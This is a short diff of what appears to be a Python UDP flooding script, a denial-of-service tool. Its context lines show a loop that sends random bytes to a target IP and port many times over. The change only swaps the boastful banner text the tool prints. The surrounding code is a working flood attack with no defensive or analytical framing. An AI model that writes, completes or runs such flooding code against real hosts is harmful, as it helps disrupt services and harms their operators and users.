@@ -23,9 +23,9 @@ def run():
       addr = (str(ip),int(port))
       for x in range(times):
         s.sendto(data,addr)
-      print(i +" | FRL DILAWAN!!!|")
+      print(i +" | DAVE NIH BOSS!!!|")
     except:
-      print("[!] | FRL DILAWAN!!! |")
+      print("[!] | DAVE NIH BOSS!!! |")
 
 def run2():
   data = random._urandom(16)
